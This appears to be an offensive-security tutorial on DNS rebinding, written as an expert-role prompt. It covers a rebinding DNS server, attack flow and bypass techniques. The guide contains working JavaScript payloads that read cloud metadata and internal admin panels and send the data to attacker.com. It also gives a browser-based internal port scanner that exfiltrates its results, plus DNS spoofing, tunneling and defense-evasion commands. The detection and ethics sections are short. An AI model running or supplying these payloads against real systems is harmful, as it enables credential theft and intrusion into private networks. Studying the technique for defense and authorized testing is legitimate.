# 21 - DNS Rebinding Attacks: Chaining DNS Rebinding for Internal Network Exploitation

## Expert Role Definition

You are the world's foremost authority on DNS rebinding attacks and internal network exploitation through DNS manipulation. You possess deep expertise in DNS protocol internals, TTL manipulation, browser same-origin policy enforcement, and the complete lifecycle of DNS rebinding exploits. You understand how DNS caching layers interact, how browsers resolve hostnames, and how to weaponize DNS resolution timing to pivot from external attacker-controlled domains into internal networks, cloud metadata endpoints, and air-gapped services. Your expertise spans traditional rebinding techniques, modern browser mitigations and their bypasses, and the chaining of DNS rebinding with SSRF, session hijacking, and lateral movement in enterprise environments. You have executed authorized red-team engagements where DNS rebinding was the primary initial access vector, successfully exfiltrating data from internal admin panels and cloud instance metadata.

## Core Concepts

DNS rebinding is an attack where a malicious DNS server alternates the IP address it returns for a given domain across successive resolutions. The first resolution returns an attacker-controlled IP to establish a browser context (satisfying same-origin policy), then subsequent resolutions return an internal IP, allowing JavaScript running in that context to access internal services as if they were same-origin.

The attack exploits the gap between DNS resolution and subsequent HTTP requests. When a browser loads `evil.com`, it resolves the A record to `attacker.com`. The page sets up JavaScript that will make requests to `evil.com` again. By the time the second request occurs, the DNS server has changed the record to point to `169.254.169.254` (cloud metadata) or `127.0.0.1` (local services). The browser treats this as same-origin because the hostname matches.

TTL manipulation is critical. The attacker's DNS server returns a very low TTL (0-1 second) to prevent legitimate DNS caching, ensuring each fresh resolution can return a different IP. Without TTL control, intermediate DNS resolvers may cache the initial IP and the rebinding never occurs.

Same-origin policy enforcement varies by browser. Chrome historically used the hostname plus scheme plus port for origin determination, not the resolved IP. This means `evil.com:80` over HTTP always matches `evil.com:80` over HTTP regardless of which IP it resolves to. Modern browsers have implemented partial mitigations but gaps remain.

The DNS rebinding cycle operates in three phases: registration (establishing the domain with the attacker's DNS server), first-touch (resolving to attacker IP to load malicious JavaScript), and rebinding (subsequent resolution to internal IP to execute the exploit from the same-origin context).

DNS caching at multiple layers creates both obstacles and opportunities. Browser caches, OS resolver caches, and corporate DNS forwarders all have different TTL behaviors. Understanding these layers allows precise timing of rebinding windows.

The attack surface includes any web application that trusts hostname-based access control, internal services accessible from the user's network, cloud metadata endpoints accessible from the same VPC, and development servers bound to localhost.

## Pre-requisite Knowledge

- DNS protocol fundamentals: A records, CNAME records, TTL values, and recursive versus authoritative resolution
- Same-origin policy: how browsers enforce origin isolation, CORS, and the specific rules for hostname matching
- HTTP protocol: request/response cycle, connection reuse, and keep-alive behavior
- Browser architecture: DNS resolution hooks, caching mechanisms, and security boundary enforcement
- Network fundamentals: internal IP ranges (RFC 1918), link-local addresses, and cloud metadata IP ranges
- Common internal services: admin panels on localhost, database interfaces, container orchestration dashboards
- Cloud environments: AWS EC2 metadata (169.254.169.254), GCP metadata, Azure IMDS
- Browser developer tools: Network tab, DNS resolution logging, and JavaScript console for debugging
- DNS server configuration: authoring zones, setting TTL values, and wildcard records

## Chain Architecture / Attack Flow Diagram

```
                    DNS REBINDING ATTACK FLOW
                    =========================

    [Attacker]                    [DNS Server]                 [Victim Browser]
         |                              |                              |
         |  1. Register evil.com        |                              |
         |  with custom DNS server      |                              |
         |----------------------------->|                              |
         |                              |                              |
         |  2. Victim visits evil.com   |                              |
         |  (phishing, ad, link)        |                              |
         |------------------------------|----------------------------->|
         |                              |                              |
         |  3. DNS Resolution #1        |                              |
         |  evil.com -> 1.2.3.4        |<-----------------------------|
         |  (attacker IP, TTL=0)        |------------------------------->|
         |                              |                              |
         |  4. Load attacker JS         |                              |
         |  Establish evil.com origin   |                              |
         |                              |  5. JS triggers request      |
         |                              |  to evil.com                 |
         |                              |         |                    |
         |  6. DNS Resolution #2        |         |                    |
         |  evil.com -> 169.254.169.254 |<--------|                    |
         |  (internal IP, TTL=0)        |----------------------------->|
         |                              |                              |
         |  7. Same-origin request      |                              |
         |  to cloud metadata endpoint  |                              |
         |                              |  8. Response returned to     |
         |  9. Attacker exfiltrates     |  attacker-controlled JS     |
         |     data via evil.com        |                              |
         |<-----------------------------------------------------------|
         |                              |                              |
    INTERNAL NETWORK ACCESS ACHIEVED    |                              |
         |                              |                              |

    TARGET IP RANGES:
    ┌─────────────────────────────────────────┐
    │ Cloud Metadata:  169.254.169.254        │
    │ Localhost:       127.0.0.1              │
    │ Private Range:   10.x.x.x, 172.16-31   │
    │ Link-local:      169.254.x.x           │
    │ Docker:          172.17.0.x             │
    └─────────────────────────────────────────┘
```

## Step-by-Step Exploitation Methodology

**Phase 1: DNS Server Setup**

Deploy a DNS server you control. The simplest approach is using a custom Python DNS server with variable responses:

```python
# rebinder.py - Custom DNS server for rebinding
from twisted.internet import reactor, defer
from twisted.names import dns, server, authority

class RebindingResolver(authority.FileAuthority):
    def __init__(self):
        super().__init__()
        self.ttl = 0
        self.internal_targets = [
            '169.254.169.254',
            '127.0.0.1',
            '10.0.0.1',
        ]
        self.current_index = 0

    def _doLookup(self, name, timeout=None):
        record = dns.RRHeader(
            name=str(name),
            type=dns.A,
            ttl=self.ttl,
            payload=dns.Record_A(
                address=self._next_ip(),
                ttl=self.ttl
            )
        )
        return defer.succeed([record])

    def _next_ip(self):
        ip = self.internal_targets[self.current_index % len(self.internal_targets)]
        self.current_index += 1
        return ip
```

Use the `rbndr` tool for simpler setup:

```bash
git clone https://github.com/taviso/rbndr.git
cd rbndr
# Configure zone file to alternate between attacker and target IPs
sudo ./rebinder --listen 0.0.0.0:53
```

**Phase 2: Malicious Page Deployment**

Host the JavaScript payload on your attacker-controlled server:

```html
<script>
async function exploit() {
    // Wait for DNS TTL to expire and rebind
    await new Promise(r => setTimeout(r, 2000));
    try {
        const resp = await fetch('http://evil.com/latest/meta-data/');
        const data = await resp.text();
        new Image().src = 'https://attacker.com/steal?data=' + encodeURIComponent(data);
    } catch(e) {
        // Try localhost admin panel
        try {
            const adminResp = await fetch('http://evil.com:8080/admin');
            const adminData = await adminResp.text();
            new Image().src = 'https://attacker.com/steal?admin=' + encodeURIComponent(adminData);
        } catch(e2) { console.log('No internal services accessible'); }
    }
}
window.onload = exploit;
</script>
```

**Phase 3: Victim Delivery**

Send the malicious URL through phishing emails, XSS on trusted sites, social engineering, or malvertising on ad networks.

**Phase 4: Data Exfiltration and Post-Exploitation**

Monitor your attacker server for incoming exfiltrated data. Once internal access is achieved, enumerate internal services, extract cloud metadata credentials, and chain with SSRF for deeper network penetration.

## Tool Arsenal

```bash
# rbndr - DNS rebinding tool
git clone https://github.com/taviso/rbndr.git
sudo ./rebinder --listen 0.0.0.0:53

# dnschef - DNS manipulation tool
pip install dnschef
sudo dnschef --fakeip 169.254.169.254 --fakedomains metadata.google.internal

# dnscat2 - DNS tunneling for exfiltration
sudo apt-get install dnscat2
dnscat2-server evil.com

# dig for DNS resolution verification
dig @localhost evil.com +short
dig @localhost evil.com +ttlunits

# nslookup for quick DNS checking
nslookup evil.com 127.0.0.1

# curl for testing internal endpoints
curl -H "Host: evil.com" http://169.254.169.254/latest/meta-data/

# socat for port forwarding during exploitation
socat TCP-LISTEN:8080,fork TCP:169.254.169.254:80

# tcpdump for DNS traffic capture and debugging
tcpdump -i eth0 port 53 -nn -v

# scapy for custom DNS packet crafting
sudo python3 -c "
from scapy.all import *
pkt = IP(dst='victim_ip')/UDP(dport=12345)/DNS(
    id=12345, qr=1, ancount=1,
    an=DNSRR(rrname='evil.com', ttl=0, rdata='169.254.169.254')
)
send(pkt)
"

# Burp Suite - Repeater for manual Host header testing
# Use Collaborator for out-of-band exfiltration tracking
```

## Real-World Case Studies

**Case Study 1: AWS EC2 Metadata Credential Theft**

A SaaS application allowed users to submit URLs for screenshot generation. By registering a domain with DNS rebinding configured to alternate between attacker IP and 169.254.169.254, an attacker submitted the URL, the service resolved it to the attacker's IP first, loaded JavaScript, then DNS rebinding switched resolution to the metadata endpoint. The JavaScript exfiltrated IAM credentials from /latest/meta-data/iam/security-credentials/, enabling full AWS account compromise and access to S3 buckets containing customer data.

**Case Study 2: Corporate Internal Panel Access**

An employee clicked a phishing link. The attacker's DNS rebinding domain first resolved to the attacker IP to load JavaScript, then rebinding switched to internal IPs. The JavaScript discovered a Jenkins instance on port 8080 with default credentials, extracted pipeline configurations containing database credentials, and enabled lateral movement to production databases exposing 50,000 customer records.

**Case Study 3: Docker Container Escape**

A developer running Docker locally visited a malicious page. DNS rebinding switched resolution to 172.17.0.1 (Docker bridge), the JavaScript discovered the Docker daemon API, created a privileged container, mounted the host filesystem, and extracted SSH keys and environment variables for production server access.

## Bypass Techniques and Evasion

**Browser Cache Bypass:** Modern browsers cache DNS responses even with low TTL. Bypass using multiple subdomains (a1.evil.com, a2.evil.com) that all rebind, cache-busting query parameters, and Service Worker registrations that trigger DNS re-resolution.

**HSTS Preload Bypass:** Target domains NOT on the HSTS preload list, or abuse subdomain take-over on HSTS-protected parent domains. Internal services rarely enforce HSTS.

**CSP Bypass:** Host rebinding payloads on CDNs allowed by CSP, combine with XSS on allowed origins, or leverage script-src unsafe-eval directives if present.

**Corporate DNS Filtering:** Use domain generation algorithms (DGA) for unique domains, register domains mimicking legitimate services, or use DNS-over-HTTPS to bypass corporate DNS servers.

**Modern Browser Mitigations:** Chrome 76 plus DNS preloading may resolve DNS early. Bypass using WebSocket connections that force DNS resolution at connection time, targeting scenarios where DNS preloading is disabled, and abusing connection reuse where DNS was already resolved.

## Defensive Indicators / Detection

**Network Level:** Unusual DNS query patterns with TTL values of 0-1 seconds, DNS queries to external authoritative servers for internal hostnames, multiple DNS resolutions for the same domain within seconds, and DNS responses alternating between external and internal IP ranges.

**Browser Level:** JavaScript making cross-origin requests to unexpected IP ranges, repeated failed connection attempts to internal service ports, large data transfers from browser to external servers in short timeframes, and Service Worker registrations on domains with suspicious DNS behavior.

**Host Level:** Unusual outbound connections from browser process to internal IP ranges, rapid connection attempts to multiple internal ports, browser process accessing cloud metadata endpoints, and HTTP requests to localhost from web pages.

## Impact Assessment Framework

| Factor | Low | Medium | High | Critical |
|--------|-----|--------|------|----------|
| Network Exposure | Same-host only | Local subnet | Corporate LAN | Internet-facing |
| Data Sensitivity | Public info | Internal docs | Credentials/PII | Financial/Health |
| Service Access | Read-only admin | Config modification | Code execution | Full control |
| Persistence | Single session | Until reboot | Persistent backdoor | Account compromise |
| Lateral Movement | No pivot | Single pivot | Multiple pivots | Full network |

Severity is typically High to Critical when cloud metadata or internal admin panels are accessible, enabling credential theft and lateral movement.

## Common Pitfalls and Anti-Patterns

- Overlooking TTL caching: Not setting TTL=0 means DNS resolvers cache the initial IP and rebinding never occurs
- Ignoring browser-specific behavior: Different browsers handle DNS caching and rebinding differently
- Assuming all internal services are accessible: The victim browser may not have network access to all internal ranges
- Not considering user interaction: Some internal services require authentication the victim has not provided
- Forgetting about CORS: Even with DNS rebinding, CORS headers may block reading the response
- Neglecting HTTPS: Internal services may use self-signed certificates that browsers reject
- Missing timing windows: DNS TTL must be short enough to rebind before JavaScript executes the second request
- Using only one target IP: Rotate through multiple internal IPs to maximize discovery

## Advanced Variations

**DNS Rebinding via WebSocket:** WebSocket connections perform DNS resolution at connection establishment, which can bypass some DNS preloading defenses. The WebSocket handshake establishes the origin, then data frames can be sent to the rebinding target.

**DNS Rebinding with HTTP/2:** HTTP/2 connection coalescing uses the certificate to match connections. If the attacker's domain has a certificate for the internal IP range, connection coalescing can be abused for rebinding.

**Subdomain-based Rebinding:** Using a wildcard DNS record with controlled subdomains allows rebinding different subdomains to different internal targets, enabling parallel internal scanning from a single attack page.

**DNS Rebinding plus SSRF Chaining:** Combine DNS rebinding with an existing SSRF vulnerability. The SSRF provides initial access, and DNS rebinding extends the reach to additional internal services without requiring the SSRF to be directly exploitable for each target.

**Cache Poisoning Integration:** Use DNS rebinding in combination with web cache poisoning. The rebinding provides access to internal cache keys, and cache poisoning delivers the malicious response to all users of the cache.

**Advanced Exfiltration Techniques:** When standard fetch-based exfiltration is blocked by CORS or CSP, use DNS exfiltration encoding data as subdomain labels, WebRTC STUN requests to leak internal IPs, WebSocket connections bypassing CORS entirely, or timing side-channels for bit-by-bit extraction.

## Integration with Other Chains

DNS rebinding integrates powerfully with SSRF Chains where rebinding extends access to internal services the SSRF endpoint cannot directly reach, Cloud Metadata Attacks for credential theft once IAM credentials are stolen via metadata, Session Hijacking to access internal session management services, XSS Chains as the initial vector to load DNS rebinding payloads, Subdomain Takeover to serve rebinding payloads from a trusted origin, Open Redirect to deliver victims to DNS rebinding pages, and Cache Poisoning for persistent rebinding delivery across users.

## Reporting and Documentation

**Report Structure:**
1. Title: DNS Rebinding Enables Internal Network Access from External Source
2. Affected Component: DNS resolution and Same-Origin Policy enforcement
3. Attack Vector: External link clicked by victim
4. Reproduction Steps: Set up DNS server with alternating IP responses, deploy payload page on attacker-controlled domain, send malicious link to victim, document each DNS resolution and resulting network access
5. Impact: Credential theft, internal service access, lateral movement potential
6. Remediation: DNS pinning, IP-based origin checks, network segmentation

**CVSS Scoring**: Typically 8.1-9.8 (High to Critical) depending on data sensitivity and network access.

## Practice Labs and Exercises

1. Local DNS Rebinding Lab: Set up a local DNS server and practice rebinding to access localhost services
2. Cloud Metadata Challenge: Practice exfiltrating IAM credentials from a mock EC2 metadata endpoint
3. Corporate Network Simulation: Build a multi-service internal network and practice discovering services via rebinding
4. Browser Comparison Lab: Test rebinding behavior across Chrome, Firefox, and Safari
5. Defense Evasion Exercise: Practice bypassing DNS caching and browser mitigations

## Ethical Guidelines

- Only test DNS rebinding against systems you own or have explicit written authorization to test
- DNS rebinding can be disruptive; coordinate testing windows with system administrators
- Never use DNS rebinding to access services handling sensitive data without authorization
- Document all testing and report findings through responsible disclosure channels
- Understand that DNS rebinding can affect all users of a DNS domain; ensure you control the domain
- Consider the impact on shared infrastructure when testing

## Quick Reference Cheat Sheet

| Tool | Purpose | Command |
|------|---------|---------|
| rbndr | DNS rebinding server | ./rebinder --listen 0.0.0.0:53 |
| dnschef | DNS spoofing | sudo dnschef --fakeip TARGET_IP |
| dnscat2 | DNS tunneling | dnscat2-server evil.com |
| dig | DNS testing | dig @attacker-dns evil.com +short |
| curl | Internal endpoint test | curl http://evil.com/metadata/ |
| Burp Repeater | Manual testing | Configure Host header manipulation |
| scapy | Custom DNS crafting | Craft DNS responses with alternating IPs |
| tcpdump | DNS traffic capture | tcpdump -i eth0 port 53 -nn |

| Target IP | Purpose | Example Service |
|-----------|---------|-----------------|
| 169.254.169.254 | Cloud metadata | AWS/GCP/Azure IMDS |
| 127.0.0.1 | Localhost services | Admin panels, dev servers |
| 10.0.0.1 | Internal gateway | Router admin interfaces |
| 172.17.0.1 | Docker bridge | Docker daemon API |
| 192.168.1.1 | Home router | Router configuration |

## DNS Rebinding in Modern Browser Context

Chrome's DNS Preconnecting feature can sometimes trigger early DNS resolution that interferes with rebinding timing. Test the specific version's behavior before assuming success. Firefox implements DNS-over-HTTPS by default in some regions, which may bypass local DNS servers entirely. Disable `network.trr.mode` in about:config during testing.

Safari on macOS uses a DNS resolution cache managed by mDNSResponder. Clear the cache with `sudo dscacheutil -flushcache` between tests to ensure consistent behavior. Edge inherits Chrome's behavior but may have additional enterprise policy restrictions.

Mobile browsers present unique challenges. iOS Safari has aggressive DNS caching that may prevent rebinding entirely. Android Chrome is more permissive but network conditions including cellular NAT and carrier DNS add unpredictability. Always test the specific browser and OS combination in your target environment.

For HSTS-preloaded domains, the browser will always use HTTPS. DNS rebinding cannot bypass this for the HSTS domain itself, but subdomains that are NOT on the HSTS preload list can still be targeted. Use hstspreload.org to check domain status before selecting targets.

## DNS Rebinding Timing Optimization

The timing between the first and second DNS resolution is critical for successful rebinding. Too short and the browser may still have the cached resolution. Too long and the user may close the page.

Optimal timing depends on the browser's DNS cache TTL. Chrome typically caches for 60 seconds. Firefox uses 60 seconds for successful lookups and 30 seconds for failed lookups. Safari caches for 10 seconds on iOS and 30 seconds on macOS.

Use the following JavaScript to measure DNS resolution timing:

```javascript
// Measure time between DNS resolutions
const startTime = performance.now();
fetch('http://evil.com/measure').then(() => {
    const elapsed = performance.now() - startTime;
    console.log('Resolution took ' + elapsed + 'ms');
});
```

For maximum reliability, implement a progressive approach: attempt the exploit multiple times with increasing delays. Use a 2-second initial delay, then retry with 5-second and 10-second delays if the first attempt fails.

## DNS Rebinding for Internal Service Enumeration

Once DNS rebinding is established, use JavaScript to enumerate internal services:

```javascript
async function enumerateInternal(subnet) {
    const commonPorts = [80, 443, 8080, 8443, 3000, 5000, 9090];
    const results = [];

    for (let i = 1; i < 255; i++) {
        for (const port of commonPorts) {
            try {
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 500);
                await fetch(`http://${subnet}.${i}:${port}/`, {
                    signal: controller.signal
                });
                clearTimeout(timeout);
                results.push(`${subnet}.${i}:${port} - OPEN`);
            } catch (e) {
                // Port closed or filtered
            }
        }
    }
    return results;
}

// Enumerate 10.x.x.x subnet from victim's network
enumerateInternal('10.0.0').then(r => {
    new Image().src = 'https://attacker.com/enum?data=' + encodeURIComponent(JSON.stringify(r));
});
```

## DNS Rebinding Defense Evasion Techniques
